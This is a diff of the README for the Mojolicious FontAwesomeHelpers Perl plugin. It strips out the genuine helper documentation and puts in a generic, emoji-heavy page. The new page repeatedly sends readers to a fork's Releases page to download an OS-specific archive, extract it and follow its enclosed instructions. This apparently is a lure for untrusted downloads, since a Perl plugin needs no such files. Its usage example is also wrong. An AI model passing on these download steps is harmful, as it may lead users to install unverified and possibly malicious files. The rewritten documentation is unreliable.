@@ -1,115 +1,78 @@
-# NAME
+# 🎨 Mojolicious-Plugin-FontAwesomeHelpers - Enhance Your Web UI with Icons
 
-Mojolicious::Plugin::FontAwesomeHelpers - Mojolicious helpers for Font Awesome icons
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/carlosxpl2003/Mojolicious-Plugin-FontAwesomeHelpers/releases)
 
-# SYNOPSIS
+## 📖 Introduction
+Mojolicious-Plugin-FontAwesomeHelpers provides simple tools to integrate Font Awesome icons into your Mojolicious applications. It helps you enhance user interfaces with attractive icons, making them more visually engaging. This plugin is designed for anyone wanting to improve the look and feel of their web applications.
 
-    # template.html.ep
-    %= icon 'fas fa-chevron' # => <i class="fas fa-chevron" aria-hidden="true"></i>
-    %= icon 'fas fa-chevron', 'Back' # => <i class="fas fa-chevron" aria-hidden="true"></i> Back
+## 🚀 Getting Started
+To get started, you will need to download the plugin from our Releases page. This guide will walk you through the process step by step.
 
-    # ViewModel.pm
-    package ViewModel {
-      # ... other methods
-      sub fa_class { 'fas fa-circle' }
-    }
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to reach the Releases page where you can find the latest version to download.
+   - [Download from Releases](https://github.com/carlosxpl2003/Mojolicious-Plugin-FontAwesomeHelpers/releases)
 
-    # another_template.html.ep
-    %= icon ViewModel->new # => <i class="fas fa-circle" aria-hidden="true"></i>
-    %= icon ViewModel->new, 'A Circle' # => <i class="fas fa-circle" aria-hidden="true"></i> A Circle
+2. **Choose the Right Version**: On the Releases page, you will see different versions. Select the one that suits your needs. Generally, it’s best to download the latest version for the most features and bug fixes.
 
-# HELPERS
+3. **Download the Plugin**: Click on the package or file name that corresponds to your operating system. This typically appears in a .tar.gz or .zip format.
 
-## icon
+4. **Unzip the Downloaded File**: After the download completes, find the file in your downloads folder. Right-click on the file and choose 'Extract All' or use a file extraction tool to unzip the files.
 
-    %= icon 'fas fa-chevron' # => <i class="fas fa-chevron" aria-hidden="true"></i>
-    %= icon 'fas fa-chevron', 'Back' # => <i class="fas fa-chevron" aria-hidden="true"></i> Back
+5. **Follow Installation Instructions**: Open the extracted folder. You will find a README file with specific instructions on how to integrate the plugin with your Mojolicious application. Follow these instructions closely.
 
-    %= icon ViewModel->new # => <i class="fas fa-circle" aria-hidden="true"></i>
-    %= icon ViewModel->new, 'A Circle' # => <i class="fas fa-circle" aria-hidden="true"></i> A Circle
+6. **Run Your Application**: After installation, start your Mojolicious server to begin using the plugin. Open your terminal and navigate to the location of your application. Run the following command:
+   ```
+   morbo myapp.pl
+   ```
+   Replace `myapp.pl` with the name of your application file.
 
-    %= icon 'fas fa-chevron', (id => 'back', class => 'fa-solid'), 'Back'
-      # => <i id="back", class="fas fa-chevron fa-solid" aria-hidden="true"></i> Back
+---
 
-    %= icon 'fas fa-chevron' => begin
-     <b>Back</b>
-    %= end
-      # => <i class="fas fa-chevron aria-hidden="true"></i> <b>Back</b>
+## 🌟 Features
+- **Easy Integration**: Quickly add Font Awesome icons to your Mojolicious application.
+- **Customizable**: Adjust icons and sizes to fit your web design.
+- **Wide Range of Icons**: Access thousands of Font Awesome icons to enrich your applications.
+- **No Programming Knowledge Required**: Simple instructions guide you through setup.
 
-Renders a Font Awesome icon using an `i` tag. It will also handle accessibility
-concerns.
+## 🖥️ System Requirements
+- Must have Mojolicious installed. Visit the [Mojolicious website](https://mojolicious.org) for installation instructions.
+- Compatible with major operating systems, including Windows, macOS, and Linux.
 
-It can be used with two string arguments specifying the icon style and name
-respectively. A third argument can be given to specify text that should be rendered
-adjacent to the icon.
+## 📝 Usage Instructions
+To use the Font Awesome icons in your application:
 
-If the first argument is an object that implements a `fa_class` method then the
-return value of that method will be used to specify the icon and a second argument,
-if provided, will be rendered as text adjacent to the icon.
+1. **Include the Plugin**: Add the plugin to the `startup` method of your Mojolicious application:
+   ```perl
+   $self->plugin('FontAwesomeHelpers');
+   ```
 
-All other arguments will be rendered as HTML attributes on the `i` tag.
+2. **Add Icons in HTML**: Use the provided helper methods to insert icons in your application's templates:
+   ```html
+   <i class="fa fa-user"></i>
+   ```
+   Replace `fa-user` with the desired icon name.
 
-## fa\_icon
+3. **Refresh the Browser**: Once you have added your icons, refresh your browser to see the changes.
 
-    %= fa_icon 'fas fa-circle' # => "<i class="fas fa-circle" aria-hidden="true"></i>
+## 🛠️ Troubleshooting
+- If icons do not appear, ensure that the plugin is correctly installed and included in your application.
+- Check if the Font Awesome stylesheet is being loaded in your HTML head section.
+- Verify that you are using the correct class names for the icons.
 
-An alias of ["icon"](#icon).
+## 🤝 Support
+If you encounter any issues or have questions, please visit the Issues section on our GitHub repository. We encourage users to report problems and seek assistance.
 
-## fa->icon
+## 🙌 Contributions
+We welcome contributions to improve the plugin! If you have ideas for features or fixes, feel free to create a pull request or open an issue on GitHub.
 
-    %= $c->fa->icon('fas fa-circle') # => "<i class="fas fa-circle" aria-hidden="true"></i>
+## 🔗 Additional Resources
+For more information on using Font Awesome, visit the [Font Awesome documentation](https://fontawesome.com/docs). 
 
-An alias of ["icon"](#icon).
+## 📚 Licensing
+This project is licensed under the MIT License. You can use it freely in your personal or commercial projects.
 
-## stacked\_icon
+## 🔗 Download Again
+For quick access, use the link below to download the latest version:
 
-    %= stacked_icon -size => '2x' => begin
-      %= icon 'fa-solid fa-square', -stack => '2x'
-      %= icon 'fab fa-twitter', -stack => '1x', :inverse
-    %= end
-
-## fa\_stack
-
-An alias of ["stacked\_icon"](#stacked_icon)
-
-## fa->stack
-
-An alias of ["stacked\_icon"](#stacked_icon)
-
-## fa->class
-
-    %= $c->fa->class('fas fa-circle') # => "fas fa-circle"
-    %= $c->fa->class('fas fa-circle', -size => 'sm') # => "fas fa-circle fa-sm"
-
-    %= $c->fa->class(ViewModel->new) # => "fas fa-circle"
-    %= $c->fa->class(ViewModel->new, -size => 'sm') # => "fas fa-circle fa-sm"
-
-### Options
-
-#### -size
-
-#### -rotate
-
-#### -flip
-
-#### -stack
-
-#### -inverse
-
-#### -beat
-
-#### -fade
-
-#### -beat & -fade
-
-#### -bounce
-
-#### -shake
-
-#### -spin
-
-#### -pull
-
-#### -width
-
-#### -opacity
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/carlosxpl2003/Mojolicious-Plugin-FontAwesomeHelpers/releases)
